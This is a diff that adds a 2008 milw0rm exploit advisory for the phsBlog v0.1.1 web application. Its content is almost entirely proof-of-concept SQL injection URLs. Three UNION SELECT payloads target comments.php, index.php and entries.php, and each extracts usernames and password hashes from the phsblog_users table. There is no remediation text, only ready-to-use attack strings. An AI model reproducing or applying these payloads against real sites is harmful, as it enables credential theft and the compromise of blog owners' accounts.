@@ -1,0 +1,21 @@
+#####################################################################################
+#
+#   Name    :   phsBlog v0.1.1 Multiple Remote SQL Injection Vulnerabilities
+#   Author  :   cOndemned [Dark-Coders member]
+#   Greetz  :   ZaBeaTy, GregStar, str0ke, 0in, suN8Hclf, ixos, TBH, Avantura :**
+#
+#####################################################################################
+
+
+Proof of Concept :
+
+    Magic Quotes = On/Off 
+
+        http://[host]/[phsBlog_path]/comments.php?eid=-1+UNION+SELECT+concat_ws(0x3a,username,password),2+FROM+phsblog_users/*
+
+    Magic Quotes = Off
+
+        http://[host]/[phsBlog_path]/index.php?cid='-1+UNION+SELECT+1,2,3,concat(username,0x3a,password),5,6,7,8,9,10,11,12,13+FROM+phsblog_users/*
+        http://[host]/[phsBlog_path]/entries.php?urltitle='-1+UNION+SELECT+1,2,3,concat(username,0x3a,password),5,6,7,8,9,10,11,12,13+FROM+phsblog_users
+
+# milw0rm.com [2008-08-01]
